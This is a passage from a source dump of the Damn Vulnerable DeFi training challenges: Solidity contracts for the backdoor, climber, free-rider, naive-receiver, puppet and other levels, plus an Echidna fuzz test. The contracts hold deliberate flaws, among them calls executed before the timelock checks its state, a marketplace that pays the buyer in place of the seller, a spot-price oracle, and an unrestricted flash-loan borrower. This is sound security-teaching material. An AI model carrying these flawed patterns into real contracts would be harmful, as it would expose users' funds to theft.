    |     constructor() ERC721("DamnValuableNFT", "DVNFT") {
    |         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    |         _setupRole(MINTER_ROLE, msg.sender);
    |     }
    | 
    |     function safeMint(address to) public onlyRole(MINTER_ROLE) returns (uint256) {
    |         uint256 tokenId = _tokenIdCounter.current();
    |         _safeMint(to, tokenId);
    |         _tokenIdCounter.increment();
    |         return tokenId;
    |     }
    | 
    |     function supportsInterface(bytes4 interfaceId)
    |         public
    |         view
    |         override(ERC721, AccessControl)
    |         returns (bool)
    |     {
    |         return super.supportsInterface(interfaceId);
    |     }
    | }
    | 

/src/contracts/DamnValuableToken.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    | 
    | /**
    |  * @title DamnValuableToken
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract DamnValuableToken is ERC20 {
    | 
    |     // Decimals are set to 18 by default in `ERC20`
    |     constructor() ERC20("DamnValuableToken", "DVT") {
    |         _mint(msg.sender, type(uint256).max);
    |     }
    | }

/src/contracts/DamnValuableTokenSnapshot.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
    | 
    | /**
    |  * @title DamnValuableTokenSnapshot
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract DamnValuableTokenSnapshot is ERC20Snapshot {
    |     
    |     uint256 private lastSnapshotId;
    | 
    |     constructor(uint256 initialSupply) ERC20("DamnValuableToken", "DVT") {
    |         _mint(msg.sender, initialSupply);
    |     }
    | 
    |     function snapshot() public returns (uint256) {
    |         lastSnapshotId = _snapshot();
    |         return lastSnapshotId;
    |     }
    | 
    |     function getBalanceAtLastSnapshot(address account) external view returns (uint256) {
    |         return balanceOfAt(account, lastSnapshotId);
    |     }
    | 
    |     function getTotalSupplyAtLastSnapshot() external view returns (uint256) {
    |         return totalSupplyAt(lastSnapshotId);
    |     }
    | }
    | 

/src/contracts/backdoor/WalletRegistry.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/access/Ownable.sol";
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
    | import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
    | 
    | /**
    |  * @title WalletRegistry
    |  * @notice A registry for Gnosis Safe wallets.
    |            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
    |  * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract WalletRegistry is IProxyCreationCallback, Ownable {
    |     
    |     uint256 private constant MAX_OWNERS = 1;
    |     uint256 private constant MAX_THRESHOLD = 1;
    |     uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    |     
    |     address public immutable masterCopy;
    |     address public immutable walletFactory;
    |     IERC20 public immutable token;
    | 
    |     mapping (address => bool) public beneficiaries;
    | 
    |     // owner => wallet
    |     mapping (address => address) public wallets;
    | 
    |     constructor(
    |         address masterCopyAddress,
    |         address walletFactoryAddress, 
    |         address tokenAddress,
    |         address[] memory initialBeneficiaries
    |     ) {
    |         require(masterCopyAddress != address(0));
    |         require(walletFactoryAddress != address(0));
    | 
    |         masterCopy = masterCopyAddress;
    |         walletFactory = walletFactoryAddress;
    |         token = IERC20(tokenAddress);
    | 
    |         for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
    |             addBeneficiary(initialBeneficiaries[i]);
    |         }
    |     }
    | 
    |     function addBeneficiary(address beneficiary) public onlyOwner {
    |         beneficiaries[beneficiary] = true;
    |     }
    | 
    |     function _removeBeneficiary(address beneficiary) private {
    |         beneficiaries[beneficiary] = false;
    |     }
    | 
    |     /**
    |      @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
    |              setting the registry's address as the callback.
    |      */
    |     function proxyCreated(
    |         GnosisSafeProxy proxy,
    |         address singleton,
    |         bytes calldata initializer,
    |         uint256
    |     ) external override {
    |         // Make sure we have enough DVT to pay
    |         require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");
    | 
    |         address payable walletAddress = payable(proxy);
    | 
    |         // Ensure correct factory and master copy
    |         require(msg.sender == walletFactory, "Caller must be factory");
    |         require(singleton == masterCopy, "Fake mastercopy used");
    |         
    |         // Ensure initial calldata was a call to `GnosisSafe::setup`
    |         require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
    | 
    |         // Ensure wallet initialization is the expected
    |         require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
    |         require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       
    | 
    |         // Ensure the owner is a registered beneficiary
    |         address walletOwner = GnosisSafe(walletAddress).getOwners()[0];
    | 
    |         require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");
    | 
    |         // Remove owner as beneficiary
    |         _removeBeneficiary(walletOwner);
    | 
    |         // Register the wallet under the owner's address
    |         wallets[walletOwner] = walletAddress;
    | 
    |         // Pay tokens to the newly created wallet
    |         token.transfer(walletAddress, TOKEN_PAYMENT);        
    |     }
    | }
    | 

/src/contracts/climber/ClimberTimelock.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/access/AccessControl.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | /**
    |  * @title ClimberTimelock
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract ClimberTimelock is AccessControl {
    |     using Address for address;
    | 
    |     bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    |     bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    | 
    |     // Possible states for an operation in this timelock contract
    |     enum OperationState {
    |         Unknown,
    |         Scheduled,
    |         ReadyForExecution,
    |         Executed
    |     }
    | 
    |     // Operation data tracked in this contract
    |     struct Operation {
    |         uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution
    |         bool known;         // whether the operation is registered in the timelock
    |         bool executed;      // whether the operation has been executed
    |     }
    | 
    |     // Operations are tracked by their bytes32 identifier
    |     mapping(bytes32 => Operation) public operations;
    | 
    |     uint64 public delay = 1 hours;
    | 
    |     constructor(
    |         address admin,
    |         address proposer
    |     ) {
    |         _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    |         _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
    | 
    |         // deployer + self administration
    |         _setupRole(ADMIN_ROLE, admin);
    |         _setupRole(ADMIN_ROLE, address(this));
    | 
    |         _setupRole(PROPOSER_ROLE, proposer);
    |     }
    | 
    |     function getOperationState(bytes32 id) public view returns (OperationState) {
    |         Operation memory op = operations[id];
    |         
    |         if(op.executed) {
    |             return OperationState.Executed;
    |         } else if(op.readyAtTimestamp >= block.timestamp) {
    |             return OperationState.ReadyForExecution;
    |         } else if(op.readyAtTimestamp > 0) {
    |             return OperationState.Scheduled;
    |         } else {
    |             return OperationState.Unknown;
    |         }
    |     }
    | 
    |     function getOperationId(
    |         address[] calldata targets,
    |         uint256[] calldata values,
    |         bytes[] calldata dataElements,
    |         bytes32 salt
    |     ) public pure returns (bytes32) {
    |         return keccak256(abi.encode(targets, values, dataElements, salt));
    |     }
    | 
    |     function schedule(
    |         address[] calldata targets,
    |         uint256[] calldata values,
    |         bytes[] calldata dataElements,
    |         bytes32 salt
    |     ) external onlyRole(PROPOSER_ROLE) {
    |         require(targets.length > 0 && targets.length < 256);
    |         require(targets.length == values.length);
    |         require(targets.length == dataElements.length);
    | 
    |         bytes32 id = getOperationId(targets, values, dataElements, salt);
    |         require(getOperationState(id) == OperationState.Unknown, "Operation already known");
    |         
    |         operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
    |         operations[id].known = true;
    |     }
    | 
    |     /** Anyone can execute what has been scheduled via `schedule` */
    |     function execute(
    |         address[] calldata targets,
    |         uint256[] calldata values,
    |         bytes[] calldata dataElements,
    |         bytes32 salt
    |     ) external payable {
    |         require(targets.length > 0, "Must provide at least one target");
    |         require(targets.length == values.length);
    |         require(targets.length == dataElements.length);
    | 
    |         bytes32 id = getOperationId(targets, values, dataElements, salt);
    | 
    |         for (uint8 i = 0; i < targets.length; i++) {
    |             targets[i].functionCallWithValue(dataElements[i], values[i]);
    |         }
    |         
    |         require(getOperationState(id) == OperationState.ReadyForExecution);
    |         operations[id].executed = true;
    |     }
    | 
    |     function updateDelay(uint64 newDelay) external {
    |         require(msg.sender == address(this), "Caller must be timelock itself");
    |         require(newDelay <= 14 days, "Delay must be 14 days or less");
    |         delay = newDelay;
    |     }
    | 
    |     receive() external payable {}
    | }
    | 

/src/contracts/climber/ClimberVault.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
    | import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
    | import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | 
    | import "./ClimberTimelock.sol";
    | 
    | /**
    |  * @title ClimberVault
    |  * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    | 
    |     uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    |     uint256 public constant WAITING_PERIOD = 15 days;
    | 
    |     uint256 private _lastWithdrawalTimestamp;
    |     address private _sweeper;
    | 
    |     modifier onlySweeper() {
    |         require(msg.sender == _sweeper, "Caller must be sweeper");
    |         _;
    |     }
    | 
    |     /// @custom:oz-upgrades-unsafe-allow constructor
    |     constructor() initializer {}
    | 
    |     function initialize(address admin, address proposer, address sweeper) initializer external {
    |         // Initialize inheritance chain
    |         __Ownable_init();
    |         __UUPSUpgradeable_init();
    | 
    |         // Deploy timelock and transfer ownership to it
    |         transferOwnership(address(new ClimberTimelock(admin, proposer)));
    | 
    |         _setSweeper(sweeper);
    |         _setLastWithdrawal(block.timestamp);
    |         _lastWithdrawalTimestamp = block.timestamp;
    |     }
    | 
    |     // Allows the owner to send a limited amount of tokens to a recipient every now and then
    |     function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
    |         require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
    |         require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
    |         
    |         _setLastWithdrawal(block.timestamp);
    | 
    |         IERC20 token = IERC20(tokenAddress);
    |         require(token.transfer(recipient, amount), "Transfer failed");
    |     }
    | 
    |     // Allows trusted sweeper account to retrieve any tokens
    |     function sweepFunds(address tokenAddress) external onlySweeper {
    |         IERC20 token = IERC20(tokenAddress);
    |         require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
    |     }
    | 
    |     function getSweeper() external view returns (address) {
    |         return _sweeper;
    |     }
    | 
    |     function _setSweeper(address newSweeper) internal {
    |         _sweeper = newSweeper;
    |     }
    | 
    |     function getLastWithdrawalTimestamp() external view returns (uint256) {
    |         return _lastWithdrawalTimestamp;
    |     }
    | 
    |     function _setLastWithdrawal(uint256 timestamp) internal {
    |         _lastWithdrawalTimestamp = timestamp;
    |     }
    | 
    |     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    |     function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
    | }
    | 

/src/contracts/compromised/Exchange.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | 
    | import "./TrustfulOracle.sol";
    | import "../DamnValuableNFT.sol";
    | 
    | /**
    |  * @title Exchange
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract Exchange is ReentrancyGuard {
    | 
    |     using Address for address payable;
    | 
    |     DamnValuableNFT public immutable token;
    |     TrustfulOracle public immutable oracle;
    | 
    |     event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    |     event TokenSold(address indexed seller, uint256 tokenId, uint256 price);
    | 
    |     constructor(address oracleAddress) payable {
    |         token = new DamnValuableNFT();
    |         oracle = TrustfulOracle(oracleAddress);
    |     }
    | 
    |     function buyOne() external payable nonReentrant returns (uint256) {
    |         uint256 amountPaidInWei = msg.value;
    |         require(amountPaidInWei > 0, "Amount paid must be greater than zero");
    | 
    |         // Price should be in [wei / NFT]
    |         uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
    |         require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");
    | 
    |         uint256 tokenId = token.safeMint(msg.sender);
    |         
    |         payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);
    | 
    |         emit TokenBought(msg.sender, tokenId, currentPriceInWei);
    | 
    |         return tokenId;
    |     }
    | 
    |     function sellOne(uint256 tokenId) external nonReentrant {
    |         require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
    |         require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");
    | 
    |         // Price should be in [wei / NFT]
    |         uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
    |         require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");
    | 
    |         token.transferFrom(msg.sender, address(this), tokenId);
    |         token.burn(tokenId);
    |         
    |         payable(msg.sender).sendValue(currentPriceInWei);
    | 
    |         emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    |     }
    | 
    |     receive() external payable {}
    | }
    | 

/src/contracts/compromised/TrustfulOracle.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";
    | 
    | /**
    |  * @title TrustfulOracle
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
    |  *         The oracle's price for a given symbol is the median price of the symbol over all sources.
    |  */
    | contract TrustfulOracle is AccessControlEnumerable {
    | 
    |     bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    |     bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");
    | 
    |     // Source address => (symbol => price)
    |     mapping(address => mapping (string => uint256)) private pricesBySource;
    | 
    |     modifier onlyTrustedSource() {
    |         require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
    |         _;
    |     }
    | 
    |     modifier onlyInitializer() {
    |         require(hasRole(INITIALIZER_ROLE, msg.sender));
    |         _;
    |     }
    | 
    |     event UpdatedPrice(
    |         address indexed source,
    |         string indexed symbol,
    |         uint256 oldPrice,
    |         uint256 newPrice
    |     );
    | 
    |     constructor(address[] memory sources, bool enableInitialization) {
    |         require(sources.length > 0);
    |         for(uint256 i = 0; i < sources.length; i++) {
    |             _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
    |         }
    | 
    |         if (enableInitialization) {
    |             _setupRole(INITIALIZER_ROLE, msg.sender);
    |         }
    |     }
    | 
    |     // A handy utility allowing the deployer to setup initial prices (only once)
    |     function setupInitialPrices(
    |         address[] memory sources,
    |         string[] memory symbols,
    |         uint256[] memory prices
    |     ) 
    |         public
    |         onlyInitializer
    |     {
    |         // Only allow one (symbol, price) per source
    |         require(sources.length == symbols.length && symbols.length == prices.length);
    |         for(uint256 i = 0; i < sources.length; i++) {
    |             _setPrice(sources[i], symbols[i], prices[i]);
    |         }
    |         renounceRole(INITIALIZER_ROLE, msg.sender);
    |     }
    | 
    |     function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
    |         _setPrice(msg.sender, symbol, newPrice);
    |     }
    | 
    |     function getMedianPrice(string calldata symbol) external view returns (uint256) {
    |         return _computeMedianPrice(symbol);
    |     }
    | 
    |     function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
    |         uint256 numberOfSources = getNumberOfSources();
    |         uint256[] memory prices = new uint256[](numberOfSources);
    | 
    |         for (uint256 i = 0; i < numberOfSources; i++) {
    |             address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
    |             prices[i] = getPriceBySource(symbol, source);
    |         }
    | 
    |         return prices;
    |     }
    | 
    |     function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
    |         return pricesBySource[source][symbol];
    |     }
    | 
    |     function getNumberOfSources() public view returns (uint256) {
    |         return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
    |     }
    | 
    |     function _setPrice(address source, string memory symbol, uint256 newPrice) private {
    |         uint256 oldPrice = pricesBySource[source][symbol];
    |         pricesBySource[source][symbol] = newPrice;
    |         emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    |     }
    | 
    |     function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    |         uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));
    | 
    |         // calculate median price
    |         if (prices.length % 2 == 0) {
    |             uint256 leftPrice = prices[(prices.length / 2) - 1];
    |             uint256 rightPrice = prices[prices.length / 2];
    |             return (leftPrice + rightPrice) / 2;
    |         } else {
    |             return prices[prices.length / 2];
    |         }
    |     }
    | 
    |     function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
    |         for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
    |             for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
    |                 if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
    |                     uint256 tmp = arrayOfNumbers[i];
    |                     arrayOfNumbers[i] = arrayOfNumbers[j];
    |                     arrayOfNumbers[j] = tmp;
    |                 }
    |             }
    |         }        
    |         return arrayOfNumbers;
    |     }
    | }

/src/contracts/compromised/TrustfulOracleInitializer.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "./TrustfulOracle.sol";
    | 
    | /**
    |  * @title TrustfulOracleInitializer
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract TrustfulOracleInitializer {
    | 
    |     event NewTrustfulOracle(address oracleAddress);
    | 
    |     TrustfulOracle public oracle;
    | 
    |     constructor(
    |         address[] memory sources,
    |         string[] memory symbols,
    |         uint256[] memory initialPrices
    |     )
    |     {
    |         oracle = new TrustfulOracle(sources, true);
    |         oracle.setupInitialPrices(sources, symbols, initialPrices);
    |         emit NewTrustfulOracle(address(oracle));
    |     }
    | }

/src/contracts/free-rider/FreeRiderBuyer.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
    | import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
    | 
    | /**
    |  * @title FreeRiderBuyer
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {
    | 
    |     using Address for address payable;
    |     address private immutable partner;
    |     IERC721 private immutable nft;
    |     uint256 private constant JOB_PAYOUT = 45 ether;
    |     uint256 private received;
    | 
    |     constructor(address _partner, address _nft) payable {
    |         require(msg.value == JOB_PAYOUT);
    |         partner = _partner;
    |         nft = IERC721(_nft);
    |         IERC721(_nft).setApprovalForAll(msg.sender, true);
    |     }
    | 
    |     // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    |     function onERC721Received(
    |         address,
    |         address,
    |         uint256 _tokenId,
    |         bytes memory
    |     ) 
    |         external
    |         override
    |         nonReentrant
    |         returns (bytes4) 
    |     {
    |         require(msg.sender == address(nft));
    |         require(tx.origin == partner);
    |         require(_tokenId >= 0 && _tokenId <= 5);
    |         require(nft.ownerOf(_tokenId) == address(this));
    |         
    |         received++;
    |         if(received == 6) {            
    |             payable(partner).sendValue(JOB_PAYOUT);
    |         }            
    | 
    |         return IERC721Receiver.onERC721Received.selector;
    |     }
    | }
    | 

/src/contracts/free-rider/FreeRiderNFTMarketplace.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | import "../DamnValuableNFT.sol";
    | 
    | /**
    |  * @title FreeRiderNFTMarketplace
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract FreeRiderNFTMarketplace is ReentrancyGuard {
    | 
    |     using Address for address payable;
    | 
    |     DamnValuableNFT public token;
    |     uint256 public amountOfOffers;
    | 
    |     // tokenId -> price
    |     mapping(uint256 => uint256) private offers;
    | 
    |     event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    |     event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    |     
    |     constructor(uint8 amountToMint) payable {
    |         require(amountToMint < 256, "Cannot mint that many tokens");
    |         token = new DamnValuableNFT();
    | 
    |         for(uint8 i = 0; i < amountToMint; i++) {
    |             token.safeMint(msg.sender);
    |         }        
    |     }
    | 
    |     function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
    |         require(tokenIds.length > 0 && tokenIds.length == prices.length);
    |         for (uint256 i = 0; i < tokenIds.length; i++) {
    |             _offerOne(tokenIds[i], prices[i]);
    |         }
    |     }
    | 
    |     function _offerOne(uint256 tokenId, uint256 price) private {
    |         require(price > 0, "Price must be greater than zero");
    | 
    |         require(
    |             msg.sender == token.ownerOf(tokenId),
    |             "Account offering must be the owner"
    |         );
    | 
    |         require(
    |             token.getApproved(tokenId) == address(this) ||
    |             token.isApprovedForAll(msg.sender, address(this)),
    |             "Account offering must have approved transfer"
    |         );
    | 
    |         offers[tokenId] = price;
    | 
    |         amountOfOffers++;
    | 
    |         emit NFTOffered(msg.sender, tokenId, price);
    |     }
    | 
    |     function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    |         for (uint256 i = 0; i < tokenIds.length; i++) {
    |             _buyOne(tokenIds[i]);
    |         }
    |     }
    | 
    |     function _buyOne(uint256 tokenId) private {       
    |         uint256 priceToPay = offers[tokenId];
    |         require(priceToPay > 0, "Token is not being offered");
    | 
    |         require(msg.value >= priceToPay, "Amount paid is not enough");
    | 
    |         amountOfOffers--;
    | 
    |         // transfer from seller to buyer
    |         token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
    | 
    |         // pay seller
    |         payable(token.ownerOf(tokenId)).sendValue(priceToPay);
    | 
    |         emit NFTBought(msg.sender, tokenId, priceToPay);
    |     }    
    | 
    |     receive() external payable {}
    | }
    | 

/src/contracts/naive-receiver/EchidnaTestNaiveReceiver.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "./FlashLoanReceiver.sol";
    | import "./NaiveReceiverLenderPool.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | /// @dev in docker: npx hardhat clean && npx hardhat compile --force && echidna-test /src --contract EchidnaTestNaiveReceiver --config /src/contracts/naive-receiver/config.yaml
    | /// @notice see https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/Exercise-6.md
    | 
    | contract EchidnaTestNaiveReceiver {
    |     using Address for address payable;
    | 
    |     uint256 constant ETH_IN_POOL = 1000e18;
    |     uint256 constant ETH_IN_RECEIVER = 10e18;
    | 
    |     NaiveReceiverLenderPool pool;
    |     FlashLoanReceiver receiver;
    | 
    |     // setup Echidna
    |     constructor() payable {
    |         pool = new NaiveReceiverLenderPool();
    |         receiver = new FlashLoanReceiver(payable(address(pool)));
    |         payable(address(pool)).sendValue(ETH_IN_POOL);
    |         payable(address(receiver)).sendValue(ETH_IN_RECEIVER);
    |     }
    | 
    |     // test if we can decrease the balance (drain it partially)
    |     // IF YOU WANT THE TEST TO FAIL THEN REMOVE ADDITION #N from ./NaiveReceiverLenderPool.sol
    |     function echidna_test_contract_balance() public view returns (bool) {
    |         return address(receiver).balance >= 10 ether;
    |     }
    | }
    | 

/src/contracts/naive-receiver/FlashLoanReceiver.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | /**
    |  * @title FlashLoanReceiver
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  * @notice possible fix: to check if the balance after the hack is bigger than
    |  * before the flash loan (see the ADDITION #N)
    |  */
    | contract FlashLoanReceiver {
    |     using Address for address payable;
    | 
    |     address payable private pool;
    | 
    |     constructor(address payable poolAddress) {
    |         pool = poolAddress;
    |     }
    | 
    |     // Function called by the pool during flash loan
    |     function receiveEther(uint256 fee) public payable {
    |         require(msg.sender == pool, "Sender must be pool");
    | 
    |         uint256 amountToBeRepaid = msg.value + fee;
    |         // ADDITION #1
    |         uint256 balanceBeforeFlashLoan = address(this).balance;
    | 
    |         require(
    |             balanceBeforeFlashLoan >= amountToBeRepaid,
    |             "Cannot borrow that much"
    |         );
    | 
    |         _executeActionDuringFlashLoan();
    | 
    |         // Return funds to pool
    |         pool.sendValue(amountToBeRepaid);
    | 
    |         // ADDITION #2
    |         // check that the flashloan has been profitable -> prevent before draining the
    |         require(
    |             address(this).balance >= balanceBeforeFlashLoan,
    |             "FlashLoan must be profitable"
    |         );
    |     }
    | 
    |     // Internal function where the funds received are used
    |     function _executeActionDuringFlashLoan() internal {}
    | 
    |     // Allow deposits of ETH
    |     receive() external payable {}
    | }
    | 

/src/contracts/naive-receiver/NaiveReceiverLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | /**
    |  * @title NaiveReceiverLenderPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  * @notice possible fix is to check inside the flashLoan that the caller is also
    |  * a borrower to prevent other peole from draining others contracts
    |  */
    | contract NaiveReceiverLenderPool is ReentrancyGuard {
    | 
    |     using Address for address;
    | 
    |     uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    | 
    |     function fixedFee() external pure returns (uint256) {
    |         return FIXED_FEE;
    |     }
    | 
    |     function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
    | 
    |         uint256 balanceBefore = address(this).balance;
    |         require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
    | 
    |         require(borrower.isContract(), "Borrower must be a deployed contract");
    |         // Transfer ETH and handle control to receiver
    |         borrower.functionCallWithValue(
    |             abi.encodeWithSignature(
    |                 "receiveEther(uint256)",
    |                 FIXED_FEE
    |             ),
    |             borrowAmount
    |         );
    |         
    |         require(
    |             address(this).balance >= balanceBefore + FIXED_FEE,
    |             "Flash loan hasn't been paid back"
    |         );
    |     }
    | 
    |     // Allow deposits of ETH
    |     receive () external payable {}
    | }
    | 

/src/contracts/puppet/PuppetPool.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "../DamnValuableToken.sol";
    | 
    | /**
    |  * @title PuppetPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract PuppetPool is ReentrancyGuard {
    | 
    |     using Address for address payable;
    | 
    |     mapping(address => uint256) public deposits;
    |     address public immutable uniswapPair;
    |     DamnValuableToken public immutable token;
    |     
    |     event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);
    | 
    |     constructor (address tokenAddress, address uniswapPairAddress) {
    |         token = DamnValuableToken(tokenAddress);
    |         uniswapPair = uniswapPairAddress;
    |     }
    | 
    |     // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
    |     function borrow(uint256 borrowAmount) public payable nonReentrant {
    |         uint256 depositRequired = calculateDepositRequired(borrowAmount);
    |         
    |         require(msg.value >= depositRequired, "Not depositing enough collateral");
    |         
    |         if (msg.value > depositRequired) {
    |             payable(msg.sender).sendValue(msg.value - depositRequired);
    |         }
    | 
    |         deposits[msg.sender] = deposits[msg.sender] + depositRequired;
    | 
    |         // Fails if the pool doesn't have enough tokens in liquidity
    |         require(token.transfer(msg.sender, borrowAmount), "Transfer failed");
    | 
    |         emit Borrowed(msg.sender, depositRequired, borrowAmount);
    |     }
    | 
    |     function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    |         return amount * _computeOraclePrice() * 2 / 10 ** 18;
    |     }
    | 
    |     function _computeOraclePrice() private view returns (uint256) {
    |         // calculates the price of the token in wei according to Uniswap pair
    |         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    |     }
    | 
    |      /**
    |      ... functions to deposit, redeem, repay, calculate interest, and so on ...
    |      */
    | 
    | }
    | 

/src/contracts/selfie/SelfiePool.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
